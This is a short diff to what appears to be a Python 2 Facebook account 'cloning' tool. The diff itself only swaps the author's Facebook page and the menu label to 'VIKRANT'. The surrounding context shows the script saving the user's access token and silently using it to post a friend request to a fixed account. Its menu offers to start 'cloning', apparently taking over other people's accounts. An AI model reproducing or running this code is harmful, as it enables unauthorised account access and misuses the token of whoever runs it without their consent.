@@ -127,7 +127,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+				os.system('xdg-open https://www.facebook.com/DARK.ANONYMOUS.VIKRANT')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -174,7 +174,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH VIKRANT"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 def pilih():
